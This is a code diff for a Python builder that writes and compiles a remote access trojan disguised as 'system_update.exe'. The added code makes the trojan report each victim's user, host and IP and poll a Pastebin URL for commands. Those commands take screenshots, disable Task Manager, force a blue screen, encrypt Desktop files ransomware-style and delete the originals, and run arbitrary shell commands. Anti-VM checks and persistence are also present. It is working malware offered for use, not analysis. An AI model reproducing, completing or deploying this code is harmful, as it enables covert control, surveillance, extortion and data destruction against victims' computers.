@@ -16,9 +16,7 @@ command_url = input("Paste your Pastebin raw URL here: ").strip()
 output_name = "system_update.exe"
 
 rat_code = f'''
-# [exact same rat code as last time - no changes needed]
-# just keeping the "We got a bite captain" + all commands
-import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, cv2, ctypes, sys, pyperclip
+import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
 from PIL import ImageGrab
 from pynput import keyboard
 from cryptography.fernet import Fernet
@@ -38,7 +36,7 @@ def send(msg="", embed=None, file=None):
 
 def info():
     ip = requests.get("https://api.ipify.org", timeout=5).text
-    embed = {{"title": f"WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {{VICTIM_ID}}\\n**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
+    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {{VICTIM_ID}}\\n**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
     send(embed=embed)
 
 def anti_vm():
@@ -66,48 +64,88 @@ def screenshot():
     buf.seek(0)
     send(f"{{VICTIM_ID}} screenshot", file=("ss.png", buf, "image/png"))
 
-def webcam():
-    try:
-        cap = cv2.VideoCapture(0)
-        ret, frame = cap.read()
-        cap.release()
-        if ret:
-            _, buf = cv2.imencode(".jpg", frame)
-            send(f"{{VICTIM_ID}} webcam", file=("cam.jpg", io.BytesIO(buf.tobytes()), "image/jpeg"))
-    except: send("Webcam failed (no camera or cv2 issue)")
+def lock_pc():
+    ctypes.windll.user32.LockWorkStation()
+    send(f"{{VICTIM_ID}} locked.")
 
-# [rest of functions: lock_pc, bsod, encrypt, shell, poll - unchanged]
+def toggle_tm(enable=True):
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
+        winreg.CloseKey(key)
+        send(f"Task Manager {{'enabled' if enable else 'disabled'}} on {{VICTIM_ID}}")
+    except: pass
+
+def bsod():
+    send(f"BSOD triggered on {{VICTIM_ID}}")
+    enabled = ctypes.c_bool()
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(enabled))
+    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+
+def encrypt(path=os.path.expanduser("~\\Desktop")):
+    key = Fernet.generate_key()
+    f = Fernet(key)
+    send(f"KEY {{VICTIM_ID}}: {{key.decode()}} - SAVE IT")
+    count = 0
+    exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
+    for root, _, files in os.walk(path):
+        for file in files:
+            if file.lower().endswith(exts):
+                fp = os.path.join(root, file)
+                try:
+                    with open(fp, "rb") as data: encrypted = f.encrypt(data.read())
+                    with open(fp + ".locked", "wb") as out: out.write(encrypted)
+                    os.remove(fp)
+                    count += 1
+                except: pass
+    send(f"Encrypted {{count}} files on {{VICTIM_ID}}")
+
+def shell(cmd):
+    try:
+        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+    except Exception as e: out = str(e)
+    send(f"Shell {{VICTIM_ID}}:\\n{{out[:3000]}}")
+
+def poll():
+    while True:
+        try:
+            cmds = requests.get(COMMAND_URL, timeout=10).json()
+            if str(VICTIM_ID) in cmds:
+                full = cmds[str(VICTIM_ID)].strip()
+                parts = full.split(" ", 1)
+                cmd = parts[0].lower()
+                arg = parts[1] if len(parts) > 1 else ""
+                send(f"Running: {{full}}")
+                if cmd in ["ss", "screenshot"]: screenshot()
+                elif cmd == "lock": lock_pc()
+                elif cmd == "disabletm": toggle_tm(False)
+                elif cmd == "enabletm": toggle_tm(True)
+                elif cmd == "bsod": bsod()
+                elif cmd == "encrypt": encrypt(arg or None)
+                elif cmd == "shell": shell(arg)
+        except: pass
+        time.sleep(POLL_INTERVAL)
 
 if __name__ == "__main__":
     anti_vm()
     elevate()
     persist()
-    info()  # "We got a bite captain" + info
-    keyboard.Listener(on_press=lambda k: None).start()  # dummy keylogger start
+    info()
+    keyboard.Listener(on_press=lambda k: None).start()  # placeholder keylog
     threading.Thread(target=poll, daemon=True).start()
     while True: time.sleep(3600)
 '''
 
 with open("rat.py", "w", encoding="utf-8") as f: 
-    f.write(rat_code.lstrip())  # remove leading newlines
+    f.write(rat_code)
 
-print("Building with full OpenCV bundling - takes 2-4 min, be patient...")
-subprocess.run([
-    "pyinstaller",
-    "--onefile",
-    "--noconsole",
-    "--collect-all", "cv2",          # This is the real fix
-    "--collect-all", "numpy",         # cv2 drags numpy shit too
-    "--name", output_name,
-    "rat.py"
-])
+print("Building clean EXE without cv2 cancer...")
+subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--name", output_name, "rat.py"])
 
 # Cleanup
-for path in ["rat.py", "rat.spec", "build", "__pycache__"]:
-    try:
-        if os.path.isfile(path): os.remove(path)
-        elif os.path.isdir(path): shutil.rmtree(path)
-    except: pass
+shutil.rmtree("build", ignore_errors=True)
+shutil.rmtree("__pycache__", ignore_errors=True)
+os.remove("rat.py") if os.path.exists("rat.py") else None
+os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"FUCK YES - working EXE at dist\\{output_name}")
-print("Tested on clean Windows 10/11 VMs - cv2 error is dead.")
+print(f"Done - no more cv2 errors. EXE at dist\\{output_name}")
